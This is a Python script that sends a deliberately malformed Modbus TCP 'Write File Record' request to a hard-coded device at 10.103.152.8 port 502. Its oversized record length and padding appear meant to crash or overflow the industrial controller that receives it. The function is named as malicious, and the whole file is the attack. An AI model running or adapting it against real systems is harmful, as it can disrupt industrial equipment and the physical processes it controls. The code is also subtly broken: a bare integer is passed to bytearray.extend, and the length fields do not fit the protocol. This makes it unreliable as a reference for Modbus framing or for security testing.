import socket
import logging

logging.basicConfig(level=logging.DEBUG)

def send_malicious_modbus_request():
    try:
        # 設定參數
        reference_type = 6
        file_number = 0
        record_number = 0
        record_length = 0xFFFE  # 設置超過正常範圍的長度
        record_data = b'\x00' * (record_length * 2)  # 記錄數據長度為 record_length * 2

        # 構建文件記錄數據
        file_record_header = bytearray()
        file_record_header.extend(reference_type.to_bytes(1, 'big'))
        file_record_header.extend(file_number.to_bytes(2, 'big'))
        file_record_header.extend(record_number.to_bytes(2, 'big'))
        file_record_header.extend(record_length.to_bytes(2, 'big'))
        file_record = file_record_header + record_data

        # 構建 Modbus PDU
        modbus_pdu_header = bytearray()
        modbus_pdu_header.extend((0x15).to_bytes(1, 'big'))  # 功能碼 0x15
        modbus_pdu_header.extend(len(file_record).to_bytes(2, 'big'))  # PDU 長度
        modbus_pdu = modbus_pdu_header + file_record

        # 構建 Modbus ADU
        modbus_adu_header = bytearray()
        modbus_adu_header.extend((1).to_bytes(2, 'big'))  # Transaction ID
        modbus_adu_header.extend((0).to_bytes(2, 'big'))  # Protocol ID
        modbus_adu_header.extend(len(modbus_pdu) + 1)  # Length (PDU 長度 + 1 字節的 Unit ID)
        modbus_adu_header.extend((1).to_bytes(1, 'big'))  # Unit ID
        modbus_request = modbus_adu_header + modbus_pdu

        # 使用 socket 發送請求
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('10.103.152.8', 502))
            logging.info("Connected to server.")

            s.send(modbus_request)
            logging.debug('Sent malicious Modbus request: %s', repr(modbus_request))

            response = s.recv(1024)
            logging.debug('Received response: %s', repr(response))

            logging.info("Connection closed.")
    except Exception as e:
        logging.error("Error in client communication: %s", e)

if __name__ == "__main__":
    send_malicious_modbus_request()
